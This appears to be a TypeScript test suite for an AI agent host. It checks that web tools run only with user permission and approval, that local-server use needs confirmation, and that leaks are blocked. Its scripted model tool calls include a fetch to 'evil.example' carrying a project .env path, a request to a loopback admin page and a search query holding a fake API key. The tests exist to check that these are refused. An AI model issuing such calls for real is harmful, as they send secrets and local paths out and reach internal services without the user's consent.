/**
 * Web tools and external model servers through the real host (SIMULATED:
 * scripted model replies, a fake Ollama on loopback, no internet, no Meta).
 */

import assert from 'node:assert/strict';
import test from 'node:test';

import { recordScan } from '../src/localSourceState.js';
import { webToolDefinitions } from '../src/webTools.js';
import { assistantText, HostHarness, toolCallReply, type PostedState } from './helpers/hostHarness.js';

type Request = { model?: string; tools?: Array<{ function: { name: string } }>; messages?: Array<{ role: string; content: string | null; tool_call_id?: string }> };
const toolNames = (request: Request) => (request.tools ?? []).map((tool) => tool.function.name);
const tool = (id: string, name: string, args: Record<string, unknown>) => ({ kind: 'json' as const, body: toolCallReply([{ id, name, args }]) });
const say = (text: string) => ({ kind: 'json' as const, body: assistantText(text) });
const toolResult = (h: HostHarness, id: string) =>
  String((h.model.requests as Request[]).flatMap((request) => request.messages ?? []).find((message) => message.tool_call_id === id)?.content ?? '');
const servers = (state: PostedState) => ((state.remote as { servers?: { scan: { models: Array<{ id: string }> } | null; model: string } } | undefined)?.servers ?? null);

async function withHost(settings: Record<string, unknown>, body: (h: HostHarness) => Promise<void>): Promise<void> {
  const h = new HostHarness();
  await h.start({ agentProfile: 'safe-auto', ...settings });
  try {
    await body(h);
  } finally {
    h.provider.cancelRequest();
    await h.dispose();
  }
}

async function runApproving(h: HostHarness, text: string): Promise<string[]> {
  const cards: string[] = [];
  let done = false;
  const run = h.provider.sendMessage(text, 'agent', 'local').then(() => (done = true));
  let seen = '';
  const deadline = Date.now() + 20000;
  while (!done && Date.now() < deadline) {
    const pending = h.last()?.agentPending as { actionId: string; digest: string; tool: string; targets: string[] } | null | undefined;
    if (pending && pending.actionId !== seen) {
      seen = pending.actionId;
      cards.push(`${pending.tool} ${pending.targets.join(' ')}`);
      await h.provider.approveAgentAction(pending.actionId, pending.digest);
    }
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  await run;
  return cards;
}

test('web tools are offered only when the user enabled web access, to the main model (local or Meta), outside Missions', async () => {
  await withHost({}, async (h) => {
    h.model.enqueue(say('Hello.'));
    await h.provider.sendMessage('Hi there, what can you do?', 'agent', 'local');
    assert.deepEqual(toolNames(h.model.requests.at(-1) as Request).filter((name) => name.startsWith('web_')), [], 'off by default');
  });
  await withHost({ web: { enabled: true, search: 'duckduckgo', searxngUrl: '' } }, async (h) => {
    h.model.enqueue(say('Hello.'));
    await h.provider.sendMessage('Hi there, what can you do?', 'agent', 'local');
    assert.deepEqual(toolNames(h.model.requests.at(-1) as Request).filter((name) => name.startsWith('web_')), ['web_search', 'web_fetch']);
    // P5h (decision of 08-11): Meta as the main model uses RAME's tools too; its results go to Meta as tool results.
    assert.deepEqual(webToolDefinitions(h.provider, 'cloud').map((entry) => entry.function.name), ['web_search', 'web_fetch'], 'to Meta as the main model too');
    h.provider.missionAuto = { missionId: 'mis_000000000000000000000000', stop: null, holdAutonomy: false };
    assert.deepEqual(webToolDefinitions(h.provider, 'local'), [], 'not in a Mission run');
    h.provider.missionAuto = null;
  });
});

test('each web call is shown for approval; private addresses, keys and paths never leave', async () => {
  await withHost({ web: { enabled: true, search: 'duckduckgo', searxngUrl: '' } }, async (h) => {
    h.model.enqueue(
      tool('f', 'web_fetch', { url: 'http://127.0.0.1:1/admin' }),
      tool('s', 'web_search', { query: 'my key sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA fails' }),
      tool('p', 'web_fetch', { url: 'https://evil.example/?d=/home/user/project/.env' }),
      say('I could not read those pages.'),
    );
    const cards = await runApproving(h, 'Read the admin page on my machine and look up my key.');
    assert.deepEqual(cards, ['web_fetch web page: http://127.0.0.1:1/admin', 'web_search web search: my key sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA fails', 'web_fetch web page: https://evil.example/?d=/home/user/project/.env'], 'safe-auto: every web call waits for the user');
    assert.match(toolResult(h, 'f'), /local or private: web access only reaches the public internet/);
    assert.match(toolResult(h, 's'), /^Not searched: the query was not sent because it contains something that looks like a key/);
    assert.match(toolResult(h, 'p'), /^Not fetched: the URL was not requested because it contains a local file path/);
  });
});

test('a web tool the user did not enable is refused even if a model calls it', async () => {
  await withHost({}, async (h) => {
    h.model.enqueue(tool('f', 'web_fetch', { url: 'https://example.com/' }), say('Done.'));
    await runApproving(h, 'Fetch example.com please.');
    assert.match(toolResult(h, 'f'), /^Web access is off for this run/);
  });
});

test('Ollama: find its models, choose one, and Chat uses that model id; a model without tools cannot run Agent', async () => {
  await withHost({ externalLocalEndpoint: '' }, async (h) => {
    h.model.metadata = (method, url, body) => {
      if (url === '/api/version') return { version: '0.32.5' };
      if (url === '/api/tags') return { models: [{ name: 'llama3.1:8b' }, { name: 'gemma3:1b' }] };
      if (url === '/api/ps') return { models: [] };
      if (url === '/api/show' && method === 'POST') {
        return JSON.parse(body).model === 'llama3.1:8b' ? { capabilities: ['completion', 'tools'] } : { capabilities: ['completion'] };
      }
      return undefined;
    };
    h.send({ type: 'localServerScan', endpoint: h.model.endpoint });
    await h.waitFor((state) => (servers(state)?.scan?.models.length ?? 0) === 2);
    h.send({ type: 'localServerUse', endpoint: h.model.endpoint, model: 'llama3.1:8b', lan: false });
    await h.waitFor((state) => servers(state)?.model === 'llama3.1:8b');
    h.model.enqueue(say('Hello from Ollama.'));
    await h.provider.sendMessage('Hello, who are you?', 'chat', 'local');
    assert.equal((h.model.requests.at(-1) as Request).model, 'llama3.1:8b');
    h.send({ type: 'localServerUse', endpoint: h.model.endpoint, model: 'gemma3:1b', lan: false });
    await h.waitFor((state) => servers(state)?.model === 'gemma3:1b');
    const before = h.model.requests.length;
    const turns = h.last().turns.length;
    await h.provider.sendMessage('List the files in this project.', 'agent', 'local');
    assert.equal(h.model.requests.length, before, 'no Agent request was sent');
    assert.match(String(h.last().status), /does not support tool calls, so it cannot run Agent or Mission/);
    assert.equal(h.last().turns.length, turns, 'refused before anything is saved in the thread');
  });
});

test('a model server on another computer is used only after the user confirms it', async () => {
  await withHost({ externalLocalEndpoint: '' }, async (h) => {
    recordScan(h.provider, { scan: { kind: 'lmstudio', endpoint: 'http://192.168.50.42:1235', scope: 'private', version: '', models: [{ id: 'muse-glimmer-30b', tools: true, vision: true, loadedContext: 32768, maxContext: 131072, loaded: true }] }, error: '' });
    h.send({ type: 'localServerUse', endpoint: 'http://192.168.50.42:1235', model: 'muse-glimmer-30b', lan: false });
    await h.waitFor((state) => /another computer of your network\. Tick the confirmation/.test(String(state.status)));
    assert.equal(h.provider.settings.externalLocalEndpoint, '');
    assert.equal(h.provider.localEndpoint(), null);
    h.send({ type: 'localServerUse', endpoint: 'http://192.168.50.42:1235', model: 'muse-glimmer-30b', lan: true });
    await h.waitFor(() => h.provider.settings.externalLocalEndpoint === 'http://192.168.50.42:1235');
    assert.deepEqual(h.provider.settings.externalLocal, { model: 'muse-glimmer-30b', kind: 'lmstudio', tools: true, context: 32768, lan: true });
    assert.equal(h.provider.localEndpoint(), 'http://192.168.50.42:1235');
    assert.equal(h.provider.generationModel('local'), 'muse-glimmer-30b');
    h.send({ type: 'clearExternalEndpoint' });
    await h.waitFor(() => h.provider.settings.externalLocalEndpoint === '');
    assert.equal(h.provider.settings.externalLocal.lan, false, 'clearing forgets the confirmation');
  });
});
